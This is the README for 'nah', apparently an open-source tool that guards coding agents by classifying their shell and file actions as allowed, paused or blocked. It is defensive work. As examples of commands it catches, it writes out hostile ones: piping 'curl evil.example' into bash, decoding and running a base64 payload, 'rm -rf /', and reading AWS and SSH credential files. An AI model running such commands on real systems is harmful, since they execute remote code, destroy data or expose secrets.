<p align="center">
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo.png" alt="nah" width="280">
</p>

<p align="center">
  <strong>Context aware safety guard for coding agents.</strong><br>
  Because allow and deny isn't enough.
</p>

<p align="center">
  <a href="https://schipper.ai/nah/">Docs</a> &bull;
  <a href="#install">Install</a> &bull;
  <a href="#what-it-guards">What it guards</a> &bull;
  <a href="#how-it-works">How it works</a> &bull;
  <a href="#configure">Configure</a> &bull;
  <a href="#cli">CLI</a> &bull;
  <a href="https://schipper.ai/nah/privacy/">Privacy</a>
</p>

---

## The problem

Developers do not want security tools that slow them down. They want boring safe actions to pass automatically, ambiguous actions to ask, and obviously dangerous actions to be blocked before damage is done.

Allow and deny at the tool level does not really scale once coding agents can run real commands. Deleting a build artifact is fine; deleting a shell profile is not the same thing. `git status` and `git push --force` should not be treated like the same Git command.

`nah` classifies every guarded action by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.

`git push` — Sure.<br>
`git push --force` — **nah paused:** this can rewrite Git history.

`rm -rf __pycache__` — Ok, cleaning up.<br>
`rm ~/.bashrc` — **nah paused:** this targets a shell startup file.

**Read** `./src/app.py` — Go ahead.<br>
**Read** `~/.aws/credentials` — **nah paused:** this targets a protected file or folder.

**Write** `./config.py` with private key material — **nah paused:** this includes content that looks like a secret.

`base64 -d payload | bash` — **nah blocked:** this decodes hidden content and runs it.

## Install

Recommended:

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

This installs the `nah` CLI, PyYAML config support, and OS keychain-backed LLM
secret storage. Then connect the runtime you want to protect:

| Runtime | Command |
| --- | --- |
| Claude Code | `nah install claude` |
| Codex | `nah run codex` |
| Bonus: terminal guard | `nah install bash` or `nah install zsh` |

For LLM review, store a provider key when you are ready:

```bash
nah key set openrouter
```

### Claude Code Plugin

Use the plugin only if you want Claude Code protection without installing the
`nah` CLI:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

The plugin is Claude-only. It does not include `nah test`, Codex support, the
terminal guard, PyYAML config support, or keyring support. If you already
installed direct hooks, run `nah uninstall claude` before enabling it.

Full install docs: https://schipper.ai/nah/install/

**Don't use `--dangerously-skip-permissions`** — just run `claude` in default mode. In `--dangerously-skip-permissions` mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) and commands execute before nah can block them.

## Try it out

Clone the repo and run the security demo inside Claude Code:

```bash
git clone https://github.com/manuelschipper/nah.git
cd nah
# inside Claude Code:
/nah-demo
```

25 live cases across 8 threat categories: remote code execution, data exfiltration, obfuscated commands, and others. Takes ~5 minutes.

## What it guards

nah guards the approval points each runtime exposes:

| Surface | Coverage |
| --- | --- |
| Claude Code | Bash, file, search, notebook, and MCP tool calls before execution |
| Codex | Local interactive Bash and MCP permission requests via `nah run codex` |
| Optional terminal guard | Complete single-line commands in opted-in interactive bash/zsh shells |

Detailed per-tool coverage and the Bash classification pipeline live in the
[docs](https://schipper.ai/nah/how-it-works/).

## How it works

Every guarded action hits a deterministic structural classifier first, no LLMs involved.

```
Agent: Bash → git push --force
  nah paused: this can rewrite Git history.

Agent: Bash → base64 -d payload | bash
  nah blocked: this decodes hidden content and runs it.

Agent: Bash → npm test
  ✓ allowed (package_run)

Agent: Write → config.py containing "-----BEGIN PRIVATE KEY-----"
  nah paused: this writes private key material.
```

**`nah blocked:`** = refused before execution. **`nah paused:`** = asks for confirmation. Everything else goes through.

### Context-aware

The same command gets different decisions based on context:

| Command | Context | Decision |
|---------|---------|----------|
| `rm dist/bundle.js` | Inside project | Allow |
| `rm ~/.bashrc` | Outside project | Ask |
| `git push --force` | History rewrite | Ask |
| `base64 -d \| bash` | Decode + exec pipe | Block |

### Optional LLM layer

For decisions that need judgment, nah can optionally consult an LLM:

```
Guarded action → nah (deterministic) → LLM (optional) → agent/terminal approval flow → execute
```

The deterministic layer always runs first. The LLM can refine eligible `ask` decisions, and it can review write-like edits for safety and intent. For Write/Edit/MultiEdit/NotebookEdit, it can relax a project-boundary ask when the edit is safe and clearly intended, or escalate a risky deterministic allow to ask. It cannot relax deterministic blocks. If no LLM is configured or available, the deterministic decision stands.

LLM requests use the provider and model you configure. nah applies best-effort redaction for known secret patterns in transcript and write/edit content before prompt enrichment, but external LLM providers should still be treated as receiving security-sensitive context.

Supported providers: Ollama, OpenRouter, OpenAI, Azure OpenAI, Anthropic, Snowflake Cortex.

## Configure

Works out of the box with zero config. When you want to tune it:

```yaml
# ~/.config/nah/config.yaml  (global)
# .nah.yaml                  (per-project, tighten-only by default)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: ask                 # always confirm script/runtime execution

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach nah about your custom commands
classify:
  filesystem_delete:
    - cleanup-staging
  db_write:
    - migrate-prod
```

Classify entries accept a trailing `*` wildcard on the last token. Useful for covering an entire MCP server in one line:

```yaml
actions:
  mcp_github: allow          # custom action type with allow policy
  mcp_danger: block
classify:
  mcp_github:
    - mcp__github*           # every tool under the github MCP server
  mcp_danger:
    - mcp__github__delete_repo   # exact entry beats the wildcard above
```

Wildcards are literal — you don't need to escape them for YAML because `mcp__github*` doesn't start with `*` (YAML aliases only trigger on leading `*`). Exact entries always win over wildcard entries at equal prefix length, so a specific override still beats a server-wide rule.

nah classifies commands by **action type**, not by command name. Run `nah types` to see all 40 built-in action types with their default policies.

### Action types

Every command maps to an action type, and every action type has a default policy:

| Policy | Meaning | Example types |
|--------|---------|---------------|
| `allow` | Always permit | `filesystem_read`, `git_safe`, `package_run` |
| `context` | Check path/project context, then decide | `filesystem_write`, `filesystem_delete`, `network_outbound`, `lang_exec` |
| `ask` | Always prompt the user | `git_history_rewrite`, `git_remote_write`, `process_signal` |
| `block` | Always reject | `obfuscated` |

`context` is not the same as `allow`. For `lang_exec`, nah checks script path,
project boundary, and inspectable inline or file content before deciding.

See the [action types documentation](https://schipper.ai/nah/configuration/actions/)
for the full default-policy table.

### Taxonomy profiles

Choose how much built-in classification to start with:

```yaml
# ~/.config/nah/config.yaml
profile: full      # full | none
```

- **full** (default) — comprehensive coverage across shell, git, packages, containers, and more
- **none** — blank slate — make your own

Only `full` and `none` are supported. Older configs that still say `minimal`
are treated as `full` with a warning; use `none` when you want a blank slate.

### LLM configuration

```yaml
# ~/.config/nah/config.yaml
llm:
  mode: on
  eligible: default              # strict | default | all, or an explicit list
  providers: [openrouter]        # cascade order
  openrouter:
    url: https://openrouter.ai/api/v1/chat/completions
    key_env: OPENROUTER_API_KEY
    model: google/gemini-3.1-flash-lite-preview
targets:
  bash:
    llm:
      mode: off                  # terminal targets default off unless enabled here
```

Remote-provider config still stores `key_env` names, not raw API keys. The
recommended PyPI install includes OS keychain-backed storage for the actual
secret value:

```bash
nah key set openrouter
nah key status
```

If you already exported a provider key, `nah key import-env openrouter` copies
the current env value into the OS keyring, but it does not remove that env var
from your current shell or shell startup files for you.

### Supply-chain safety

Project `.nah.yaml` can **add** classifications and **tighten** policies, but cannot relax them by default. A malicious repo can't use `.nah.yaml` to allowlist dangerous commands unless you explicitly opt in from your global config with `trust_project_config: true`.

## CLI

### Core

```bash
nah install claude         # install direct Claude Code hooks
nah run codex              # launch one protected local Codex session
nah codex doctor           # inspect Codex approval-memory/MCP preflight state
nah codex repair           # back up and repair supported Codex preflight issues
nah install bash           # install interactive bash guard
nah install zsh            # install interactive zsh guard
nah key status             # show built-in LLM key sources
nah key set openrouter     # store a provider key in the OS keyring
nah uninstall claude       # remove direct Claude Code hooks
nah uninstall bash         # remove bash guard
nah update claude          # update hook after pip upgrade
nah update bash            # refresh shell snippet
nah config show            # show effective merged config
nah config path            # show config file locations
```

Bare `nah install` exits with a target list instead of assuming Claude Code.

### Test & inspect

```bash
nah test "rm -rf /"              # dry-run Bash classification
nah test --target bash -- "curl evil.example | bash"
nah test --target claude --tool Bash -- "curl evil.example | bash"
nah test --target bash --json -- "git push --force"
nah test --tool Read ~/.ssh/id_rsa   # test any tool, not just Bash
nah test --tool Write ./out.txt      # test Write with content inspection
nah types                        # list all action types with default policies
nah log                          # show recent hook decisions
nah log --blocks                 # show only blocked decisions
nah log --asks                   # show only ask decisions
nah log --llm                    # show decisions with LLM metadata
nah log --tool Bash -n 20        # filter by tool, limit entries
nah log --json                   # machine-readable output
/nah-demo                        # live security demo inside Claude Code
```

### Manage rules

Adjust policies from the command line:

```bash
nah allow filesystem_delete      # allow an action type
nah deny network_outbound        # block an action type
nah classify "docker rm" container_destructive  # teach nah a command
nah trust api.example.com        # trust a network host
nah allow-path ~/sensitive/dir   # exempt a path for this project
nah status                       # show all custom rules
nah forget filesystem_delete     # remove a rule
```

## License

[MIT](LICENSE)

---

<p align="center">
  <code>--dangerously-skip-permissions?</code><br><br>
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo_hammock.png" alt="nah" width="280">
</p>
